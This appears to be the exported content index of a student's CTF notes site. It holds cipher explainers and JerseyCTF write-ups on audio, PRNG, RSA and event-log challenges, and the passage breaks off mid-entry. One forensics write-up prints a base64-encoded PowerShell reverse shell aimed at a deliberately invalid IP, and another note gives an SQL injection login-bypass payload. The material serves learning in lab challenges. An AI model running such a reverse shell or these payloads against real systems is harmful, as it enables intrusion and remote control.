{"CTF/Bin-Exp/Binary-Exploitation":{"slug":"CTF/Bin-Exp/Binary-Exploitation","filePath":"CTF/Bin Exp/Binary Exploitation.md","title":"Binary Exploitation","links":[],"tags":[],"content":""},"CTF/CTF":{"slug":"CTF/CTF","filePath":"CTF/CTF.md","title":"CTF","links":["CTF/Bin-Exp/Binary-Exploitation","CTF/Cryptography/Cryptography","CTF/Forensics/Forensics","CTF/Osint/Open-Source-Intelligence","CTF/Rev/Reverse-Engineering","CTF/Web-Exp/Web-Exploitation","CTF/Misc/Miscellaneous","CTF/CTFS/ISSESSIONS-CTF"],"tags":[],"content":"Categories\nBinary Exploitation\nCryptography\nForensics\nOpen Source Intelligence\nReverse Engineering\nWeb Exploitation\nMiscellaneous\nCTFs\nISSESSIONS CTF"},"CTF/CTFS/ISSESSIONS-CTF":{"slug":"CTF/CTFS/ISSESSIONS-CTF","filePath":"CTF/CTFS/ISSESSIONS CTF.md","title":"ISSESSIONS CTF","links":[],"tags":[],"content":""},"CTF/CTFS/MagpieCTF":{"slug":"CTF/CTFS/MagpieCTF","filePath":"CTF/CTFS/MagpieCTF.md","title":"MagpieCTF","links":[],"tags":[],"content":""},"CTF/CTFS/PicoCTF":{"slug":"CTF/CTFS/PicoCTF","filePath":"CTF/CTFS/PicoCTF.md","title":"PicoCTF","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Atbash":{"slug":"CTF/Cryptography/Ciphers/Atbash","filePath":"CTF/Cryptography/Ciphers/Atbash.md","title":"Atbash","links":[],"tags":[],"content":"Tools:\nwww.dcode.fr/atbash-cipher\nVery simple cipher, it just reverses the order of the alphabet so to say.\nSo:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nABCDEFGHIJKLMZYXWVUTSRQPONNOPQRSTUVWXYZMLKJIHGFEDCBA\nSo to encrypt ‘Man’\nM - N\na - Z\nn - M\nSo ‘Man’ = ‘NZM’\nNote: Atbash doesn’t notice casing, all letters are treated as capitals"},"CTF/Cryptography/Ciphers/BCrypt":{"slug":"CTF/Cryptography/Ciphers/BCrypt","filePath":"CTF/Cryptography/Ciphers/BCrypt.md","title":"BCrypt","links":["tags/Hashing","CTF/Cryptography/Ciphers/Blowfish"],"tags":["Hashing"],"content":"Hashing\nBlowfish\nTools:\ngchq.github.io/CyberChef/#recipe=Bcrypt(10)\nwww.devglan.com/online-tools/bcrypt-hash-generator\nwww.dcode.fr/crypt-hashing-function\nNote: There is no easy way of decoding a BCrypt Cipher\nOf those tools above, I’m not sure if any could actually break\na fully secure BCrypt\n\nen.wikipedia.org/wiki/Bcrypt ^\nIt is far too complicated for me to explain in this, just look at the wiki"},"CTF/Cryptography/Ciphers/Base32":{"slug":"CTF/Cryptography/Ciphers/Base32","filePath":"CTF/Cryptography/Ciphers/Base32.md","title":"Base32","links":["tags/Base"],"tags":["Base"],"content":"Base\nTools:\nwww.dcode.fr/base-32-encoding\ngchq.github.io/CyberChef/\ncryptii.com/pipes/base32 especially good for the different variants of Base32\nBase32 is a binary to text encoding scheme that represents binary data in an ASCII string format\nUses:\n\nOr it uses:\n\nOr it uses:\n\nOr it uses:\n\nNote they also have ’=’ as an index 32 of sorts\n= Is a padding character that doesn’t change the meaning\nThe most common alphabet is RFC 4648\nExample:\nTake the source string “Man”\nIn ASCII:\nM-77\na-97\nn-110\nThat ASCII in bits then equals:\n77 - 01001101\n97 - 01100001\n110 - 01101110\nPutting those strings together you get\n010011010110000101101110\nThen separating those into sets of 5 bits:\n01001 - 9\n10101 - 21\n10000 - 16\n10110 - 22\n1110 - NAN\nbut instead of giving an error, you add ones until you get full set, then append an = at the end:\n11100 - 28\n\n=\nThen putting that from ASCII into the Base32 alphabet\n\n9 - J\n21 - V\n16 - Q\n22 - W\n28 - 4\n= - =\nSo the encrypted text would be:\n‘Man’ = JVQW4="},"CTF/Cryptography/Ciphers/Base64":{"slug":"CTF/Cryptography/Ciphers/Base64","filePath":"CTF/Cryptography/Ciphers/Base64.md","title":"Base64","links":["tags/Base","CTF/CTFS/ISSESSIONS-CTF"],"tags":["Base"],"content":"Base\nTools:\nwww.base64decode.org/\nwww.dcode.fr/base-64-encoding\ngchq.github.io/CyberChef/\nBase64 is a binary to text encoding scheme that represents binary data in an ASCII string format\nUses:\n\nThere are two versions that have a different 62/63rd character\n\nNote the standard Base64 also has ’=’ as an index 64 of sorts\n= Is a padding character that doesn’t change the meaning\nExample:\nTake the source string “Man”\nIn ASCII:\nM-77\na-97\nn-110\nThat ASCII in bits then equals:\n77 - 01001101\n97 - 01100001\n110 - 01101110\nPutting those strings together you get\n010011010110000101101110\nThen, by separating that into sets of 6 bits you get\n010011 - 19\n010110 - 22\n000101 - 5\n101110 - 46\nIn the table above. in Base64 those translate to:\n19 - T\n22 - W\n5 - F\n46 - u\nSo, ‘Man’ using Base64 translates to ‘TWFu’\nIf for example, you only had ‘Ma’\nIn ASCII, it would be\nM-77\na-91\nin binary:\n77 - 01001101\n91 - 01100001\nIn sets of 6 bits:\n010011 - 19\n010110 - 22\n0001 -NAN\nBut instead of raising an error, it then appends 0’s til you have a set of 6 bits, and appends an ’=’ at the end of the string\nso 0001 becomes\n000100 - 4\nAnd:\n19 - T\n22 - W\n4 - E\nAppended =\nSo ‘Ma’ translates into ‘TWE=’\nAn example of a challenge where this is useful is:\nISSESSIONS CTF Easy Key 4\nYou’ve intercepted a base64 password and its right here : YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4. Yogur task is to unlock the true fla. In puzzles like this, balance is key. Maybe this string equals the flag if something is added. But you must be careful since too many cooks spoil the broth. You must change the recipe without changing the taste. Can this even be done? It may be possible to change the password without changing the meaning.\nYou also got this weird one. I don’t know what they are. It could be helpful since it looks like base64.\nCoCwpgBAZgNghgcwgSwM4QC7gE5gDQQCeA9gK4QhwBukyGmOYAdC00A==\nrZjetu8D7gfy4QnZAJGRMGwb5tBLUBcvUvkY3LEK2dxjVzNE6kT1ou09Un1mEVqN5jR===\n=\nYruDaoDF4AWD5MbtsDi=====\nThe solution to this was to take YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4 and add ===\nSo the final key was bhbureauCTF{YWhJc2VleW91Z290X3RoZXBhc3N3b3JkLXlvdS13aW4 === } as adding the ’=’ doesn’t change the decoded text at all."},"CTF/Cryptography/Ciphers/Block-Transposition-Cipher":{"slug":"CTF/Cryptography/Ciphers/Block-Transposition-Cipher","filePath":"CTF/Cryptography/Ciphers/Block Transposition Cipher.md","title":"Block Transposition Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Blowfish":{"slug":"CTF/Cryptography/Ciphers/Blowfish","filePath":"CTF/Cryptography/Ciphers/Blowfish.md","title":"Blowfish","links":["tags/Hashing","CTF/Cryptography/Ciphers/BCrypt"],"tags":["Hashing"],"content":"Hashing\nBCrypt"},"CTF/Cryptography/Ciphers/CSR-Certificate":{"slug":"CTF/Cryptography/Ciphers/CSR-Certificate","filePath":"CTF/Cryptography/Ciphers/CSR Certificate.md","title":"CSR Certificate","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Caesar-Cipher":{"slug":"CTF/Cryptography/Ciphers/Caesar-Cipher","filePath":"CTF/Cryptography/Ciphers/Caesar Cipher.md","title":"Caesar Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Hashing":{"slug":"CTF/Cryptography/Ciphers/Hashing","filePath":"CTF/Cryptography/Ciphers/Hashing.md","title":"Hashing","links":["tags/Hashing","CTF/Cryptography/Ciphers/MD5","CTF/Cryptography/Ciphers/BCrypt","CTF/Cryptography/Ciphers/SHA1","CTF/Cryptography/Ciphers/SHA256","CTF/Cryptography/Ciphers/SHA512","CTF/Cryptography/Ciphers/Blowfish"],"tags":["Hashing"],"content":"Hashing\nMD5\nBCrypt\nSHA1\nSHA256\nSHA512\nBlowfish"},"CTF/Cryptography/Ciphers/Hexadecimal":{"slug":"CTF/Cryptography/Ciphers/Hexadecimal","filePath":"CTF/Cryptography/Ciphers/Hexadecimal.md","title":"Hexadecimal","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Leet-Speak":{"slug":"CTF/Cryptography/Ciphers/Leet-Speak","filePath":"CTF/Cryptography/Ciphers/Leet Speak.md","title":"Leet Speak","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/MD5":{"slug":"CTF/Cryptography/Ciphers/MD5","filePath":"CTF/Cryptography/Ciphers/MD5.md","title":"MD5","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Mod-and-Match":{"slug":"CTF/Cryptography/Ciphers/Mod-and-Match","filePath":"CTF/Cryptography/Ciphers/Mod and Match.md","title":"Mod and Match","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Morse-Code":{"slug":"CTF/Cryptography/Ciphers/Morse-Code","filePath":"CTF/Cryptography/Ciphers/Morse Code.md","title":"Morse Code","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/RSA-Cipher":{"slug":"CTF/Cryptography/Ciphers/RSA-Cipher","filePath":"CTF/Cryptography/Ciphers/RSA Cipher.md","title":"RSA Cipher","links":["CTF/CTFS/MagpieCTF"],"tags":[],"content":"MagpieCTF\nexamples\nMagpieCTF\nimp3rf3ct:\ninverse-converse\nall-ends-same\ngrey-area"},"CTF/Cryptography/Ciphers/Rail-Fence-Cipher":{"slug":"CTF/Cryptography/Ciphers/Rail-Fence-Cipher","filePath":"CTF/Cryptography/Ciphers/Rail Fence Cipher.md","title":"Rail Fence Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA1":{"slug":"CTF/Cryptography/Ciphers/SHA1","filePath":"CTF/Cryptography/Ciphers/SHA1.md","title":"SHA1","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA256":{"slug":"CTF/Cryptography/Ciphers/SHA256","filePath":"CTF/Cryptography/Ciphers/SHA256.md","title":"SHA256","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/SHA512":{"slug":"CTF/Cryptography/Ciphers/SHA512","filePath":"CTF/Cryptography/Ciphers/SHA512.md","title":"SHA512","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Steganography":{"slug":"CTF/Cryptography/Ciphers/Steganography","filePath":"CTF/Cryptography/Ciphers/Steganography.md","title":"Steganography","links":["CTF/CTFS/MagpieCTF","CTF/Web-Exp/Web-Exploitation"],"tags":[],"content":"MagpieCTF\nexamples\nMagpieCTF\nHelmet:\nWeb Exploitation"},"CTF/Cryptography/Ciphers/Substitution-Cipher":{"slug":"CTF/Cryptography/Ciphers/Substitution-Cipher","filePath":"CTF/Cryptography/Ciphers/Substitution Cipher.md","title":"Substitution Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Vigenere-Cipher":{"slug":"CTF/Cryptography/Ciphers/Vigenere-Cipher","filePath":"CTF/Cryptography/Ciphers/Vigenere Cipher.md","title":"Vigenere Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/Whitespace-Cipher":{"slug":"CTF/Cryptography/Ciphers/Whitespace-Cipher","filePath":"CTF/Cryptography/Ciphers/Whitespace Cipher.md","title":"Whitespace Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Ciphers/XOR-Cipher":{"slug":"CTF/Cryptography/Ciphers/XOR-Cipher","filePath":"CTF/Cryptography/Ciphers/XOR Cipher.md","title":"XOR Cipher","links":[],"tags":[],"content":""},"CTF/Cryptography/Cryptography":{"slug":"CTF/Cryptography/Cryptography","filePath":"CTF/Cryptography/Cryptography.md","title":"Cryptography","links":["CTF/CTF","CTF/Cryptography/Ciphers/Base64","CTF/Cryptography/Ciphers/Base32","CTF/Cryptography/Ciphers/Vigenere-Cipher","CTF/Cryptography/Ciphers/Caesar-Cipher","CTF/Cryptography/Ciphers/CSR-Certificate","CTF/Cryptography/Ciphers/Substitution-Cipher","CTF/Cryptography/Ciphers/Rail-Fence-Cipher","CTF/Cryptography/Ciphers/Block-Transposition-Cipher","CTF/Cryptography/Ciphers/Steganography","CTF/Cryptography/Ciphers/Mod-and-Match","CTF/Cryptography/Ciphers/RSA-Cipher","CTF/Cryptography/Ciphers/Morse-Code","CTF/Cryptography/Ciphers/SHA1","CTF/Cryptography/Ciphers/SHA256","CTF/Cryptography/Ciphers/SHA512","CTF/Cryptography/Ciphers/MD5","CTF/Cryptography/Ciphers/BCrypt","CTF/Cryptography/Ciphers/Whitespace-Cipher","CTF/Cryptography/Ciphers/Hexadecimal","CTF/Cryptography/Ciphers/XOR-Cipher","CTF/Cryptography/Ciphers/Atbash","CTF/Cryptography/Ciphers/Leet-Speak","CTF/Cryptography/Ciphers/Blowfish"],"tags":[],"content":"CTF\nCryptography is used to denote the subset of challenges that require decoding/encrypting certain text in order to get another answer/flag\nOne of the best tools for identifying which cipher to use for the encrypted text is:\nwww.dcode.fr/cipher-identifier\nCiphers\nBase64\nBase32\nVigenere Cipher\nCaesar Cipher\nCSR Certificate\nSubstitution Cipher\nRail Fence Cipher\nBlock Transposition Cipher\nSteganography\nMod and Match\nRSA Cipher\nMorse Code\nSHA1\nSHA256\nSHA512\nMD5\nBCrypt\nWhitespace Cipher\nHexadecimal\nXOR Cipher\nAtbash\nLeet Speak\nBlowfish"},"CTF/Forensics/Forensics":{"slug":"CTF/Forensics/Forensics","filePath":"CTF/Forensics/Forensics.md","title":"Forensics","links":[],"tags":[],"content":""},"CTF/Misc/Miscellaneous":{"slug":"CTF/Misc/Miscellaneous","filePath":"CTF/Misc/Miscellaneous.md","title":"Miscellaneous","links":[],"tags":[],"content":""},"CTF/Osint/Open-Source-Intelligence":{"slug":"CTF/Osint/Open-Source-Intelligence","filePath":"CTF/Osint/Open Source Intelligence.md","title":"Open Source Intelligence","links":[],"tags":[],"content":""},"CTF/Pwn/Pwn":{"slug":"CTF/Pwn/Pwn","filePath":"CTF/Pwn/Pwn.md","title":"Pwn","links":[],"tags":[],"content":""},"CTF/Rev/Reverse-Engineering":{"slug":"CTF/Rev/Reverse-Engineering","filePath":"CTF/Rev/Reverse Engineering.md","title":"Reverse Engineering","links":[],"tags":[],"content":""},"CTF/Web-Exp/Browser-Edit":{"slug":"CTF/Web-Exp/Browser-Edit","filePath":"CTF/Web Exp/Browser Edit.md","title":"Browser Edit","links":["CTF/CTFS/PicoCTF"],"tags":[],"content":"PicoCTF\nInspect element,\nin the three dots at the top right click more tools\nThen click network conditions\nThen scroll down and change user from\n“custom browser” to the desired browser"},"CTF/Web-Exp/Common-http-add-ons":{"slug":"CTF/Web-Exp/Common-http-add-ons","filePath":"CTF/Web Exp/Common http add-ons.md","title":"Common http add-ons","links":["CTF/CTFS/MagpieCTF","CTF/CTFS/PicoCTF"],"tags":[],"content":"MagpieCTF   PicoCTF\n/robots.txt\n/login\n/admin\n/.htaccess\n/.DS_Store"},"CTF/Web-Exp/Cookie-Bypass":{"slug":"CTF/Web-Exp/Cookie-Bypass","filePath":"CTF/Web Exp/Cookie Bypass.md","title":"Cookie Bypass","links":["CTF/CTFS/MagpieCTF"],"tags":[],"content":"MagpieCTF"},"CTF/Web-Exp/SQL-injection":{"slug":"CTF/Web-Exp/SQL-injection","filePath":"CTF/Web Exp/SQL injection.md","title":"SQL injection","links":["CTF/CTFS/PicoCTF"],"tags":[],"content":"PicoCTF\nBasic SQL injection:\n’ OR 1=1—"},"CTF/Web-Exp/Web-Exploitation":{"slug":"CTF/Web-Exp/Web-Exploitation","filePath":"CTF/Web Exp/Web Exploitation.md","title":"Web Exploitation","links":["tags/ctf"],"tags":["ctf"],"content":"ctf"},"WRITEUPS/JerseyCTF/Frequencies-of-Deception":{"slug":"WRITEUPS/JerseyCTF/Frequencies-of-Deception","filePath":"WRITEUPS/JerseyCTF/Frequencies-of-Deception.md","title":"Frequencies-of-Deception","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nFrequencies-of-Deception\nForensics\nWorth 822 Points\nEasy\nBy Trent\n\nAn intercepted audio transmission carries a veiled warning. Some say it’s just noise, others believe it’s the key to an unsolved mystery. Use your forensic skills to dissect the frequencies and uncover the message lurking in the static. Flag format jctf{}\nNote: For this challenge the flag format is NOT jctfv{} but is instead jctf{}\nThen it had an attached ‘unknown.wav’ file\n\nSolution\nAfter listening to the wav file, I immediately recognized it as those old dial tones where each tone corresponded to a certain number/symbol (I can’t believe this is considered old now). So I knew that I somehow had to decipher what tones corresponded with which numbers/symbols and had to collect them somehow.\nI asked my teammates if they knew any program that could decipher this and Wxrth led me to a dtmf-detector, that led me to a nice app dtmf.netlify.app/\nWith that, I put in my unknown.wav file and left the sensitivity as 0.050 and got a nice output of\n**Decoded:** 048049049048048049048048032048049048048049049049049032048049049048049049049048032048049048049048049048048032048049048049049049049049032048049048048048048049049032048048049049048048048048032048049049048049049048049032048049049048048049048049032048049048049049049049049032048048049048048049048048032048049049049048049048048032048049048048048048048049032048049048049049048048049032048049048049049049049049032048049049048048048048049032048049048049048049049049032048049048048048048048048032048049048049049048048049032048049048049049049049049032048049048048048049049048032048049049049048048049048032048048049049048048048048032048049048048049049048049032048049048049049049049049032048049049049048049048048032048049049048049048048048032048048049048048048048049032048049049049048048049049032048049048049049049049049032048049048049048048048048032048049049048049049048048032048049048048048048048048032048049049048048048049049032048049048048048049048049\n\nI recognized that output as ASCII code so I then put it into an ASCII decoder and got:\n01100100 01001111 01101110 01010100 01011111 01000011 00110000 01101101 01100101 01011111 00100100 01110100 01000001 01011001 01011111 01100001 01010111 01000000 01011001 01011111 01000110 01110010 00110000 01001101 01011111 01110100 01101000 00100001 01110011 01011111 01010000 01101100 01000000 01100011 01000101\n\nWhich I recognized as binary code, so I put that into Binary to text decoder and got:\ndOnT_C0me_$tAY_aW@Y_Fr0M_th!s_Pl@cE\nFlag\nI then wrapped that with the specific flag format for Frequencies-of-Deception and got the correct flag:\njctf{dOnT_C0me_$tAY_aW@Y_Fr0M_th!s_Pl@cE}"},"WRITEUPS/JerseyCTF/Prng-Pred":{"slug":"WRITEUPS/JerseyCTF/Prng-Pred","filePath":"WRITEUPS/JerseyCTF/Prng-Pred.md","title":"Prng-Pred","links":["CTF/Cryptography/Cryptography","CTF/Cryptography/Ciphers/XOR-Cipher"],"tags":[],"content":"Cryptography XOR Cipher\nDescription\nPrng-Pred\nCryptography\nWorth 919 Points\nHard\nBy KDShetty11\n\nWe created a custom random number generator using XOR-Shift to help us generate pseudorandom numbers. THere may have been an issue with our initialization. Here are the first 5 generated values. Can you predict the next one?\nprng-pred.aws.jerseyctf.com:5000/\nThe link led to a website that looked like this:\n\nSolution\nThe problem provided five sequential outputs from an XOR-Shift based pseudorandom number generator (PRNG) with the goal to determine the next number in the sequence. I realized that because XOR-Shift generators are deterministic, we could infer the shift parameters used in the PRNG, so we could predict the next number\nThat led to me developing the following program:\nUsing the given sequence ‘2796150728, 1619295863, 4160883531, 3273899421, 3467984294’ I brute-force all reasonable values for the shift parameters a, b, c\n(Note the generated sequence is different every time you load the page, so you have to edit the progam accordingly)\ndef xorshift(x, a, b, c):\n\n    # Perform the XOR-shift steps with given shift parameters.\n\n    # All operations are done on 32-bit unsigned integers.\n\n    x ^= (x &lt;&lt; a) &amp; 0xFFFFFFFF\n\n    x ^= (x &gt;&gt; b)\n\n    x ^= (x &lt;&lt; c) &amp; 0xFFFFFFFF\n\n    return x &amp; 0xFFFFFFFF\n\n  \n\n# Given sequence\n\nsequence = [2796150728, 1619295863, 4160883531, 3273899421, 3467984294]\n\n  \n\n# We&#039;ll search for shift parameters a, b, c in a reasonable range (e.g. 1 to 31)\n\nvalid_parameters = []\n\n  \n\nfor a in range(1, 32):\n\n    for b in range(1, 32):\n\n        for c in range(1, 32):\n\n            valid = True\n\n            x = sequence[0]\n\n            # Test if the recurrence holds for the entire provided sequence.\n\n            for expected in sequence[1:]:\n\n                x = xorshift(x, a, b, c)\n\n                if x != expected:\n\n                    valid = False\n\n                    break\n\n            if valid:\n\n                # Compute the next value using these parameters.\n\n                next_val = xorshift(sequence[-1], a, b, c)\n\n                valid_parameters.append(((a, b, c), next_val))\n\n  \n\nif valid_parameters:\n\n    print(&quot;Found valid shift parameters and their predicted next values:&quot;)\n\n    for params, next_val in valid_parameters:\n\n        print(f&quot;Shift parameters a, b, c = {params} --&gt; Next value = {next_val}&quot;)\n\nelse:\n\n    print(&quot;No valid shift parameters found in the tested range.&quot;)\n\nAfter running the script, it output:\nFound valid shift parameters and their predicted next values:\nShift parameters a, b, c = (13, 7, 17) --&gt; Next value = 2506751581\n\n\nFlag\nAfter inputting 2506751581 into the website it confirmed that my prediction was right and outputted the flag:\njctfv{Predictable_PRNG_Rizzed}"},"WRITEUPS/JerseyCTF/Read-the-Rules":{"slug":"WRITEUPS/JerseyCTF/Read-the-Rules","filePath":"WRITEUPS/JerseyCTF/Read the Rules.md","title":"Read the Rules","links":[],"tags":[],"content":"Worth 1 pt\nJerseyCTF V Rules\nPlease open the attached pdf, and read the rules and terms &amp; conditions to gain access to all the challenges for JerseyCTF V (the flag is in the pdf)\nNotes for the JerseyCTF V\nPlease note that all flags are case sensitive, and unless otherwise specified in the challenge description, follow the format shown below:\nFlag format for JerseyCTF V : jctfv{answer_flags_like_this}\nAfter reading the rules, I figured I had to read the attached PDF in order to find the flag (Quite the forensics challenge)\nAfter parsing through the attached pdf file, I found the following at the very bottom of the third page after much searching and suffering: jctfv{i_agree_to_the_rules}\nAnd luckily, it was the right flag!\n"},"WRITEUPS/JerseyCTF/The-Hidden-Key":{"slug":"WRITEUPS/JerseyCTF/The-Hidden-Key","filePath":"WRITEUPS/JerseyCTF/The-Hidden-Key.md","title":"The-Hidden-Key","links":["CTF/Cryptography/Cryptography","CTF/Cryptography/Ciphers/RSA-Cipher"],"tags":[],"content":"Cryptography RSA Cipher\nDescription\nThe-Hidden-Key\nCryptography\nWorth 100 points\nEasy\nBy Dylan\n\nAn anonymous party was using Wireshark looking network activity and stumbled across this encrypted text, they then notified NICC and sent the file. This could be a key to something.\nThen it had a link download to a ‘TheHiddenKey.txt’ file which contained:\nn: 20167919\ne: 65537\nct: [10254726, 8086048, 6236280, 17208595, 10736836, 5882601, 15516508, 7658876, 2682380, 10736836, 15449006, 6236280, 11933731, 5504792, 922598, 11933731, 758869, 5504792, 17208595, 4826125, 7658876, 5504792, 2682380, 4744868, 12442849, 4826125, 7658876, 1039218, 15449006, 6236280, 2682380, 4826125, 4744868, 4111665]\n\nSolution\nImmediately after seeing the txt file I recognized it as an RSA cipher because of the recognizable Public Key Value, e, and Ciphertext.\nSo, in order to solve the RSA you have to follow the following steps for each ciphertext:\n\nFactorize n to find p and q\nCompute ϕ(n)=(p−1)(q−1)\nFind d as the modular inverse of e modulo ϕ(n)\nComputer m = c^d mod(n)\nUse m and the ASCII alphabet to find what letter each ciphertext corresponds to\n\nI then wrote a simple program that ran through the above steps for each of the ciphertexts\nfrom sympy import isprime, gcdex\n\nfrom math import isqrt\n\n  \n\ndef factorize_n(n):\n\n    for i in range(2, isqrt(n) + 1):\n\n        if n % i == 0:\n\n            p, q = i, n // i\n\n            if isprime(p) and isprime(q):\n\n                return p, q\n\n    return None, None\n\n  \n\ndef modinv(e, phi):\n\n    d, _, _ = gcdex(e, phi)\n\n    return d % phi\n\n  \n\ndef rsa_decrypt(n, e, ct):\n\n    p, q = factorize_n(n)\n\n    if not p or not q:\n\n        raise ValueError(&quot;Failed to factorize n&quot;)\n\n    phi = (p - 1) * (q - 1)\n\n    d = int(modinv(e, phi))\n\n  \n\n    decrypted = [pow(c, d, n) for c in ct]\n\n    return &#039;&#039;.join(chr(m) for m in decrypted)\n\n  \n\n# Given values\n\nn = 20167919\n\ne = 65537\n\nct = [10254726, 8086048, 6236280, 17208595, 10736836, 5882601,\n\n      15516508, 7658876, 2682380, 10736836, 15449006, 6236280, 11933731,\n\n      5504792, 922598, 11933731, 758869, 5504792, 17208595, 4826125,\n\n      7658876, 5504792, 2682380, 4744868, 12442849, 4826125, 7658876,\n\n      1039218, 15449006, 6236280, 2682380, 4826125, 4744868, 4111665]\n\n  \n\n# Decrypt and print the message\n\ntry:\n\n    decrypted_message = rsa_decrypt(n, e, ct)\n\n    print(&quot;Decrypted message:&quot;, decrypted_message)\n\nexcept ValueError as err:\n\n    print(&quot;Error:&quot;, err)\n\nFlag\nAfter running the above code, it output the correct flag:\njctfv{Pr1v@t3_k3y_f0r_1nF0rm@t10n}"},"WRITEUPS/JerseyCTF/The-Veiled-Backtrace":{"slug":"WRITEUPS/JerseyCTF/The-Veiled-Backtrace","filePath":"WRITEUPS/JerseyCTF/The-Veiled-Backtrace.md","title":"The-Veiled-Backtrace","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nThe-Veiled-Backtrace\nForensics \nWorth 930 Points \nEasy \nBy Trent\n\nA hard drive full of photos. Hundreds of still frames, nothing out of the ordinary. But something’s tucked away — veiled, deliberate. One image holds more than meets the eye. Peel back the layers. Follow the trace.\nFlag format: jctf{IP:Port} Note: For this challenge the flag format is NOT jctfv{} but instead jctf{} Note: The IP is not a valid/real IP, this is for your protection.\nAnd it had a download link to ‘archive.zip’ which contained 100 jpg files and 1 ’…’ file.\n\nSolution\nInitially, because this was a forensics challenge, I thought I had to go through each image in order to find some sort of hidden data, so I spent ~30 minutes putting the jpgs through exiftool in order to find anything, but came up with nothing.\nThen I realized (After way too long) that there was a non-jpg file in the zip: ’…’\nAfter opening ’…’ it gave:\nÿØÿàZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzY3OC40NjIuMTQ2LjMzNCcsIDg3ODkpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg== \nWhich after seeing it ending with == I immediately recognized it as base64 code, and after decrypting it, it gave:\nNet.Sockets.TCPClient(&#039;678.462.146.334&#039;, 8789)\n(Note it gave a lot more text, but whenever I put that into this file, Windows considered it a trojan horse and completely wiped this folder)\nAnd from that I noticed what the flag format was trying to get:\njctf{IP:Port} Note: The IP is not a valid/real IP, this is for your protection\nFlag\nSo after putting them together I got the flag\n“jctf{678.462.146.334:8789}”"},"WRITEUPS/JerseyCTF/evtx":{"slug":"WRITEUPS/JerseyCTF/evtx","filePath":"WRITEUPS/JerseyCTF/evtx.md","title":"evtx","links":["CTF/Forensics/Forensics"],"tags":[],"content":"Forensics\nDescription\nevtx\nForensics\nWorth 453 Points\nEasy\nBy Jan\n\nIt appears that one of the low-level grunts of the NICC organization have gone rogue. They keep trying to get into a user’s account by guessing their password. Can you tell us 1. the name of the user who is being targeted with brute force password guessing attempts and 2. the number of times the rogue user has tried to get into the account? The flag should have the format jctfv{Name_Number} where Name is the username and Number is the count.\nIt then had a download to a ‘evtx.zip’ which contained a Windows XML EventLog file ‘chal.evtx’\nIn that file, it contained 141 different events\n\nSolution\nAfter looking through every event, I found that all events with Event ID 4625 corresponded to a failed log on which is what I need for the flag.\nSo, there 17 different instances of failed logons, but they weren’t necessarily brute force failed attempts, they could’ve been a regular user just mis-entering their password, so I had to dig a little deeper.\n\nAfter inspecting each of the failed attempts, I was able to see that odds are, the brute force attempts went from\n1:28:16 to 1:29:04\nSo I inspected each of the attempts between 1:28:16 and 1:29:04 and each of them looked very similar to:\n\nand were all targeted at User500, whereas any of the failed login attempts after 1:29:04 looked similar to:\n\n\nand were targeted at random users, which made me think these were just accidental failed-logons\nSo, I counted each of the failed logon attempts on User500 between 1:28:16 and 1:29:04 and found there were 11 attempts.\nFlag\nI then took User500 and 11, and put it into the flag format for this questions: jctfv{Name_Number} and got the correct flag:\njctfv{User500_11}"},"WRITEUPS/SwampCTF/Beginner-Pwn-1":{"slug":"WRITEUPS/SwampCTF/Beginner-Pwn-1","filePath":"WRITEUPS/SwampCTF/Beginner Pwn 1.md","title":"Beginner Pwn 1","links":["CTF/Pwn/Pwn"],"tags":[],"content":"Pwn\nDescription\nBeginner Pwn 1\nPwn\nWorth 25 Points\n\nAre you really admin?\nThis challenge 